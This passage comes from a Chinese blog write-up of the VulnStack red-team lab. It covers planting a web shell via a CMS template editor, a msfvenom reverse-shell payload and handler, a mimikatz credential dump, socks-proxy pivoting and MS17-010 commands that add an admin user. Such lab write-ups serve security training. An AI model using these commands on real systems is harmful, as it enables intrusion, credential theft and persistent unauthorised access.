vulnerable:</span><br><span class="line">|       host</span><br><span class="line">|       port</span><br><span class="line">|       login</span><br><span class="line">|_      funName</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.8.168</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.168:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: /l.php#bottom</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.168:80/l.php</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: /l.php#bottom</span><br><span class="line">| http-phpself-xss: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Unsafe use of $_SERVER[&quot;PHP_SELF&quot;] in PHP files</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|       PHP files are not handling safely the variable $_SERVER[&quot;PHP_SELF&quot;] causing Reflected Cross Site Scripting vulnerabilities.</span><br><span class="line">|              </span><br><span class="line">|     Extra information:</span><br><span class="line">|       </span><br><span class="line">|   Vulnerable files with proof of concept:</span><br><span class="line">|     http://192.168.8.168/l.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E</span><br><span class="line">|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.8.168</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</span><br><span class="line">|_      http://php.net/manual/en/reserved.variables.server.php</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpinfo.php: Possible information file</span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|   /phpMyAdmin/: phpMyAdmin</span><br><span class="line">|_  /PHPMyAdmin/: phpMyAdmin</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line">MAC Address: 00:0C:29:69:9D:AD (VMware)</span><br><span class="line"></span><br><span class="line"># Nmap done at Tue Jan  2 22:27:59 2024 -- 1 IP address (1 host up) scanned in 84.04 seconds</span><br></pre></td></tr></table></div></figure>
+
+<p>探测到了 sql 注入与 phpmyadmin 后台。不过决定先尝试一下其他方法。</p>
+
+        <h2 id="2-2：漏洞分析-渗透攻击"   >
+          <a href="#2-2：漏洞分析-渗透攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2：漏洞分析-渗透攻击" class="headerlink" title="2.2：漏洞分析 &amp; 渗透攻击"></a>2.2：漏洞分析 &amp; 渗透攻击</h2>
+      <p>根据网站泄露的信息直接访问网站后台：<code>http://192.168.8.168/yxcms/index.php?r=admin</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2619282bd300497c9a7219c4d46b12bd.png" alt="在这里插入图片描述"></p>
+<p>直接进入了后台。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d08f9259818548a5b0dd68737350a64d.png" alt="在这里插入图片描述"></p>
+<p>功能很多啊。这里发现 “ 前台模板 ” 处可以直接编辑 php 文件。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/87fc5edc5b824957ad70e38dc87f93fb.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3f562902956845e6b540e418f566bc80.png" alt="在这里插入图片描述"></p>
+<p>在首页随便点击几个板块，找到了该 CMS 模板名称与 url 的关系。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/94a7f56185094d428a88858e0cd2d5f1.png" alt="在这里插入图片描述"></p>
+<p>这里就选择 <font style="background:#70AD47">photo_index.php</font> 写入一句话木马。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/1ba703aa9842432298eca474ccd8a499.png" alt="在这里插入图片描述"></p>
+<p>再次访问板块可以发现木马已执行。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2b05183280e442198083e452f5f60acb.png" alt="在这里插入图片描述"></p>
+<p>使用蚁剑连接：</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/186b5b759a794c83865e935ea89ccfe2.png" alt="在这里插入图片描述"></p>
+
+        <h2 id="2-3：后渗透"   >
+          <a href="#2-3：后渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3：后渗透" class="headerlink" title="2.3：后渗透"></a>2.3：后渗透</h2>
+      
+        <h3 id="2-3-1：提权"   >
+          <a href="#2-3-1：提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-1：提权" class="headerlink" title="2.3.1：提权"></a>2.3.1：提权</h3>
+      <p>先利用蚁剑的虚拟终端随便查看一下信息。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/426068959bd141b984fb8a9fa3f4f65d.png" alt="在这里插入图片描述"></p>
+<p>直接就是 admin 账户，很省事，方便提权至 system。</p>
+<p>那就先试试反弹 shell。因为目标机器 445 端口有防火墙过滤，所以这里使用 metasploit 生成后门文件，然后上传至目标机器反弹 shell。</p>
+<p><strong>msf，启动！</strong>（<br><code>msfdb init &amp;&amp; msfconsole</code></p>
+<p>查看一下 Windows 反弹 shell 的相关工具。<br><code>search windows/meterpreter/reverse_tcp</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/296d777e4d61471bbbfb570406fa90a6.png" alt="在这里插入图片描述"></p>
+<p>可以查看一下相关参数。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/90ab398cec0f4447a198fae6af1a46f9.png" alt="在这里插入图片描述"></p>
+<p><strong>生成 Windows 后门程序</strong>（Windows 载荷）：<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.15 LPORT=7777 -f exe -o &#39;/root/Desktop/att&amp;ck-1/shell.exe&#39;</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/34663b46163548768095e2e97d5fac37.png" alt="在这里插入图片描述"></p>
+<p><strong>msf 配置启动监听</strong>。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.8.15</span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fdb58d622ef24b2cb3a25f7df752bdcc.png" alt="在这里插入图片描述"></p>
+<p>将刚才生成的 Windows 后门程序 shell.exe 通过蚁剑上传到目标机器并运行。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/1d44837de40d43678091a877b8b3c90e.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0b9490e5c3df47db8f75533134db473b.png" alt="在这里插入图片描述"></p>
+<p>成功反弹 shell。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c56075db1d2b4f35bddd8427c14a838f.png" alt="在这里插入图片描述"></p>
+<p>执行 <code>post/windows/manage/enable_rdp</code> 模块，<strong>关闭防火墙并启用远程桌面</strong>。<br><code>run post/windows/manage/enable_rdp</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/6ec6c5b480374c51873bd9d64659c81c.png" alt="在这里插入图片描述"></p>
+<p>使用 <code>rdesktop</code> 打开远程桌面。可以看到控制成功。<br><code>rdesktop 192.168.8.168</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/efa09528ad3146be967210bff3909e70.png" alt="在这里插入图片描述"></p>
+<p><strong>查看用户，提权</strong>：<br><code>getuid</code><br><code>getsystem</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fdf3166411eb40ff882c4737bcf0e20c.png" alt="在这里插入图片描述"></p>
+
+        <h3 id="2-3-2：内网渗透"   >
+          <a href="#2-3-2：内网渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-2：内网渗透" class="headerlink" title="2.3.2：内网渗透"></a>2.3.2：内网渗透</h3>
+      
+        <h4 id="2-3-2-1：信息收集"   >
+          <a href="#2-3-2-1：信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-2-1：信息收集" class="headerlink" title="2.3.2.1：信息收集"></a>2.3.2.1：信息收集</h4>
+      <p>为内网的渗透做一些准备。<strong>后渗透阶段的信息收集</strong>包括但不限于以下操作：</p>
+<p><strong>使用 msf 模块进行信息收集</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches         <span class="comment"># 查询补丁信息</span></span><br><span class="line">run post/windows/gather/enum_applications    <span class="comment"># 查询已安装软件</span></span><br><span class="line">run get_local_subnets                        <span class="comment"># 查看路由信息</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/911db063f1f14ac0b149803f01f55e61.png" alt="在这里插入图片描述"></p>
+<p><strong>使用 Windows 下命令进行信息收集</strong>：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wmic os get osarchitecture                # 查看系统架构</span><br><span class="line">ipconfig /all                             # 查询本机IP段，所在域等</span><br><span class="line">route print                               # 路由信息 </span><br><span class="line">net config workstation                    # 当前计算机名，用户名，系统版本，工作站域    </span><br><span class="line">net user                                  # 本机用户列表   </span><br><span class="line">net user /domain                          # 当前域下本机的所有用户 </span><br><span class="line">net localgroup administrators             # 本机管理员[通常含有域用户]    </span><br><span class="line">net view                                  # 查看域信息/局域网内其他主机    </span><br><span class="line">net view /domain                          # 查询主域信息   </span><br><span class="line">net time /domain                          # 判断主域</span><br><span class="line">net start                                 # 查看开启了哪些服务</span><br><span class="line">net share                                 # 查看开启了哪些共享        </span><br><span class="line">net group &quot;domain controllers&quot; /domain    # 查看域控制器组</span><br><span class="line">net group &quot;domain computers&quot; /domain      # 查看域中的其他主机</span><br><span class="line">net group &quot;domain admins&quot; /domain         # 尝试查询域管理员的名字</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>《Windows 判断是否存在域，搜集域内基本信息》<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36279445/article/details/110647055" >https://blog.csdn.net/qq_36279445&#x2F;article&#x2F;details&#x2F;110647055</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<p>另外，如果遇到乱码问题，在 Windows shell 中执行 <code>chcp 65001</code> 可以缓解部分乱码问题。</p>
+<blockquote>
+<p><code>chcp</code> 是 Windows 中的命令，用于改变当前控制台的代码页（code page）。<code>65001</code> 则是特定的表示 UTF-8 编码的代码页。<br><code>chcp 65001</code> 的作用是将当前控制台的代码页设置为 UTF-8。（将部分输出转换为英文）<br>Windows 中，默认代码页通常根据系统区域设置而确定，而不是总是设置为 UTF-8。</p>
+</blockquote>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/defa7ba2994d406d8af2554589bb4b21.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/448a296041d0416a887a0fe4a812bc34.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/975e1ed2c29e485ca1b252e72e56eeee.png" alt="在这里插入图片描述"></p>
+<p><strong>确定了域控主机名</strong>：OWA。IP：192.168.52.138。</p>
+<p>以上是一些基础的信息收集，下面进行进一步的信息收集。</p>
+<p><strong>抓取目标机器上的密码 Hash</strong>。</p>
+<p><code>hashdump</code> 已经过时了，不过可以使用 <code>post/windows/gather/smart_hashdump</code> 模块。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/51849e03ec9e467c8c63f76ebdc8f535.png" alt="在这里插入图片描述"></p>
+<p><strong>抓取密码 Hash</strong>：<br><code>run windows/gather/smart_hashdump</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/823c53d78ce1472cb24122c2c4cb7449.png" alt="在这里插入图片描述"></p>
+<p>虽然抓到了密码 hash，不过根据结果来看并没有解密成功。</p>
+<p>那就上传 mimikatz 来抓取密码。（实战中需要做免杀处理）</p>
+<blockquote>
+<p>kali 自带 mimikatz：<font style="background:#70AD47">&#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;</font></p>
+</blockquote>
+<p><strong>确定一下目标机器的系统版本</strong>。<br><code>wmic os get osarchitecture</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2de24d0db5784137b1be6f4b46e6656c.png" alt="在这里插入图片描述"></p>
+<p>通过 msf 上传 mimikatz 至目标机器指定位置。<br><code>upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe c:\\</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/42a36b3ab9244e1c91f2ceb7f531aa89.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d93f90f2093a459bb4a60c24bec8c800.png" alt="在这里插入图片描述"></p>
+<p><strong>提升 mimikatz 权限</strong>：<br><code>privilege::debug</code></p>
+<p><strong>抓取密码</strong>：<br><code>sekurlsa::logonpasswords</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/b15d937d4a0a4da4a2ca24d4ec5f7ab6.png" alt="在这里插入图片描述"></p>
+<p>成功获取 GOD 域下 Administrator（域管理员）的明文密码：<code>hongri@2023</code>。</p>
+<p>接下来进一步渗透内网（横向移动），对域中其他主机进行渗透。这里服务器为已被控制的机器。</p>
+
+        <h4 id="2-3-2-2：内网穿透"   >
+          <a href="#2-3-2-2：内网穿透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-2-2：内网穿透" class="headerlink" title="2.3.2.2：内网穿透"></a>2.3.2.2：内网穿透</h4>
+      <p><strong>通过 msf 借助服务器使用 ping 命令探测内网存活主机</strong>。<br><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c15d73b1a0ac4b2fb1254c88ddf55af3.png" alt="在这里插入图片描述"></p>
+<p>探测到几台主机，给 msf 添加内网路由，进行下一步渗透。</p>
+<blockquote>
+<p>MSF 跳板功能是 MSF 框架中自带的一个路由转发功能。实现过程就是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往 “ 内网 ” 的路由，以此直接使用 MSF 去访问原本不能直接访问的内网资源。</p>
+</blockquote>
+<p><strong>通过已控制的 session 添加内网路由</strong>：<br><code>route add 192.168.52.141 255.255.255.0 4</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fe52667546ea415fa8347db41517408a.png" alt="在这里插入图片描述"></p>
+<p>添加成功。</p>
+<blockquote>
+<p>也可以添加全网段路由，这样可以访问被控机器可达的所有地址：<br><code>route add 0.0.0.0 0.0.0.0 &lt;session id&gt;</code></p>
+</blockquote>
+<p>测试一下，使用 <code>post/windows/gather/arp_scanner</code> 模块扫描内网主机。<br><code>run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/53b7b58ffe644ff98f03ac835217b65d.png" alt="在这里插入图片描述"></p>
+<p>现在 msf 已经可以通信到内网其他主机，为了让攻击机上的其他工具可以通信到内网其他主机，需要设置代理。</p>
+<p>这里用 EarthWorm 做 Socks5 代理作为跳板进入内网。</p>
+<blockquote>
+<p>也可以借助已获取内网通信的 msf 来设置 sock4a 代理，使攻击机其他工具通信到内网。参考：<br>《ATT&amp;CK红队评估实战靶场-1》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40638006/article/details/122033546" >https://blog.csdn.net/qq_40638006&#x2F;article&#x2F;details&#x2F;122033546</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<blockquote>
+<p>内网穿透工具 EarthWorm（EW）项目地址：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/idlefire/ew" >https://github.com/idlefire/ew</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<blockquote>
+<p>后来发现 ew 已经停止更新很久了。。。在这里补充一些内网渗透的知识和工具。<br>《内网穿透常用方法系列总结》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64910183/article/details/129211220" >https://blog.csdn.net/m0_64910183&#x2F;article&#x2F;details&#x2F;129211220</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>《几款实用的内网穿透工具》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/MachineGunJoe/article/details/129385096" >https://blog.csdn.net/MachineGunJoe/article/details/129385096</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>《内网安全：内网穿透详解》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/131037631" >https://blog.csdn.net/qq_61553520&#x2F;article&#x2F;details&#x2F;131037631</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<p><strong>下载 EW 后将相应版本上传到主机</strong>。（已控制的服务器为 Win7）</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3d08c8f05db54de98c8494cb80043fb1.png" alt="在这里插入图片描述"></p>
+<p>通过 msf 上传到 win7 受害主机。<br><code>upload &#39;/root/Desktop/att&amp;ck-1/ew_for_Win.exe&#39; c:\\</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/6cd06443c2c742a88e6f37fbce50620b.png" alt="在这里插入图片描述"></p>
+<p><strong>给攻击机上的 ew 添加可执行权限并监听等待连接</strong>（真实情况下可借助 VPS）。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ew_for_linux64</span><br><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2fd49e03b35b43b2b7498307e88b21cf.png" alt="在这里插入图片描述"></p>
+<p><strong>在 win7 上启动 socks5 服务器反弹到攻击机上</strong>（真实情况下反弹至 VPS 的 IP）。<br><code>ew_for_Win.exe -s rssocks -d 192.168.8.15 -e 1234</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/7cf2956e3f6f498a825aaf252358db61.png" alt="在这里插入图片描述"></p>
+<p>这样就建立了一条通信通道。<strong>使用 proxychains4 作为代理</strong>。</p>
+<p><code>proxychains4</code> 配置文件 <font style="background:#70AD47">&#x2F;etc&#x2F;proxychains4.conf</font>。配置代理。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d2e116b0131246faac1f702134d114fc.png" alt="在这里插入图片描述"></p>
+<p>测试一下内网穿透。<br><code>proxychains4 nmap -p 3389,21,445 -Pn -sT 192.168.52.141</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/9ffd0a26dd1147f381435ce0427145f7.png" alt="在这里插入图片描述"></p>
+<p>成功。</p>
+<blockquote>
+<p>这里使用的是 socks5 协议，支持 TCP&#x2F;UDP 等，但不支持 ICMP，即不能使用 <code>ping</code>。所以 nmap 必须加上参数 <code>-Pn</code>、<code>-sT</code>。</p>
+</blockquote>
+<p>proxychain4 会输出一些超时错误信息，不方便查看，可以加上参数 <code>-q</code> 使用安静模式。<br><code>proxychains4 -q nmap -p 3389,21,445 -Pn -sT 192.168.52.141</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/77783da544374435b7a17a397909aa41.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>也可以将错误信息重定向。<br><code>proxychains4 nmap -p 3389,21,445 -Pn -sT 192.168.52.141 2&gt;/dev/null</code></p>
+</blockquote>
+<p>在内网信息收集时已经确定域控为 192.168.52.138。那就先渗透身为域成员的 192.168.52.141。</p>
+
+        <h4 id="2-3-2-3：横向移动"   >
+          <a href="#2-3-2-3：横向移动" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-2-3：横向移动" class="headerlink" title="2.3.2.3：横向移动"></a>2.3.2.3：横向移动</h4>
+      <p>由于通过代理，nmap 使用 TCP 扫描，速度比较慢，先简单扫描一下内网主机。这里先对 192.168.52.141 下手。</p>
+<p><strong>nmap 扫描</strong>。</p>
+<p><code>proxychains4 -q nmap 192.168.52.141 -Pn -sT --top-ports 200</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/26d27a24904c4fa98e31960e4eb3ae51.png" alt="在这里插入图片描述"></p>
+<p><code>proxychains4 -q nmap 192.168.52.141 -Pn -sT -O</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8093da86b9964f00ba13f6513e3bb540.png" alt="在这里插入图片描述"></p>
+<p><code>proxychains4 -q nmap 192.168.52.141 -Pn -sT -p 21,445,3389</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/98e318764362472492c5f8090a131404.png" alt="在这里插入图片描述"></p>
+<p>可以看到 3389 端口关闭，nmap 的 OS 探测模棱两可。445 端口开启，可以使用 msf 的 <code>auxiliary/scanner/smb/smb_version</code> 模块探测下操作系统版本。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4e122ba1fed34206af5a1117f9e63e52.png" alt="在这里插入图片描述"></p>
+<p>可以确定 192.168.52.141 为 Win 2003。</p>
+<p>445 端口开启，可以尝试利用 MS17-010（永恒之蓝）漏洞。<br><code>search ms17-010</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c280ce6a38474bbfb44ab77a79316492.png" alt="在这里插入图片描述"></p>
+<p>使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块检测，发现 MS17-010 可利用。</p>
+<p>使用 <code>auxiliary/admin/smb/ms17_010_command</code> 模块执行命令将目标 3389 端口开启。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/836cec1f167b42fbb322e6aee32f71a1.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/e7cab77a434a4e2ea5e8f166a37818f8.png" alt="在这里插入图片描述"></p>
+<p>再次扫描 3389 端口可以发现开放。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3dac8829a1fd4ef4a8fbda528d9904dc.png" alt="在这里插入图片描述"></p>
+<p>此时已经可以通过远程桌面登录。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/cc868a8de4c4440abc2fe845562fae6c.png" alt="在这里插入图片描述"></p>
+<p>这里可以尝试使用 <code>exploit/windows/smb/ms17_010_psexec</code> 模块获取一个 shell。不过此模块需要指定一个管理员用户才能更好利用，所以先用 <code>auxiliary/admin/smb/ms17_010_command</code> 模块添加一个管理员用户。</p>
+<p>添加用户 bob：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> COMMAND net user bob 123.com /add</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8d51e56f8b9741218d87649648490117.png" alt="在这里插入图片描述"></p>
+<p>将用户 bob 添加至管理员组：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> COMMAND net localgroup administrators bob /add</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fd18e75a3d284c64a8f83fbda7c1402a.png" alt="在这里插入图片描述"></p>
+<p>查看一下结果：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> COMMAND net localgroup administrators</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/db2515d54bec4d30b45d01bd9575b0c9.png" alt="在这里插入图片描述"></p>
+<p>然后使用 <code>exploit/windows/smb/ms17_010_psexec</code> 模块尝试获得 session，不过尝试都失败了。</p>
